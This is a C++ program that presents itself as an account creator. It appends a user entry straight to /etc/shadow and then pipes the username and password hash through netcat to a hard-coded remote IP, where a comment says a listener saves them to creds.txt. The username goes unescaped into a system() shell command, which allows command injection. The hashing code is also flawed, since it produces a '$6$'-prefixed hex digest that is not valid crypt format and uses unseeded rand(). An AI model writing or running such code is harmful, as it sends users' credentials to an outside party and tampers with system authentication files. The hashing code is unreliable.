#include <iostream>
#include <string>
#include <sstream>
#include <iomanip>
#include <openssl/sha.h>
#include <fstream>
#include <cstdlib>
#include <ctime>

std::string generateSalt() {
    const char* chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789./";
    std::string salt = "$6$"; // Indicate SHA-512
    for (int i = 0; i < 16; ++i) { // 16-byte salt
        salt += chars[rand() % 64];
    }
    return salt;
}

std::string hashPassword(const std::string& password, const std::string& salt) {
    std::string saltedPassword = salt + password;
    unsigned char hash[SHA512_DIGEST_LENGTH];
    SHA512(reinterpret_cast<const unsigned char*>(saltedPassword.c_str()), saltedPassword.size(), hash);
    
    std::ostringstream oss;
    for (int i = 0; i < SHA512_DIGEST_LENGTH; ++i) {
        oss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(hash[i]);
    }
    return salt + "$" + oss.str();
}

int main() {
    std::string username, password;

    std::cout << "Enter new username: ";
    std::getline(std::cin, username);
    std::cout << "Enter new password: ";
    std::getline(std::cin, password);

    // Generate a salt and hash the password
    std::string salt = generateSalt();
    std::string hashedPassword = hashPassword(password, salt);

    // Get the current date (days since epoch)
    time_t now = time(0);
    long daysSinceEpoch = static_cast<long>(now) / (60 * 60 * 24);

    // Construct the entry for /etc/shadow dynamically
    std::string shadowEntry = username + ":" + hashedPassword + ":" + std::to_string(daysSinceEpoch) + ":0:99999:7:::";
    
    // Path to the shadow file
    std::string filepath = "/etc/shadow";

    // Open the shadow file for appending
    std::ofstream ofs(filepath, std::ios::app);
    if (!ofs) {
        std::cerr << "Error opening /etc/shadow for writing." << std::endl;
        return 1;
    }

    // Write the new entry to the shadow file
    ofs << shadowEntry << std::endl;
    ofs.close();

    std::cout << "Account created successfully!" << std::endl;

    // Send user and hashed password via netcat - other server runs nc -lvp 9000 > creds.txt
    std::string command = "echo 'Username: " + username + "\\nHashed Password: " + hashedPassword + "' | nc 10.233.105.137 9000";

    // Execute the command
    if (system(command.c_str()) != 0) {
        std::cerr << "Error sending credentials to remote server." << std::endl;
        return 1;
    }

    std::cout << "Credentials sent to remote server successfully!" << std::endl;

    return 0;
}
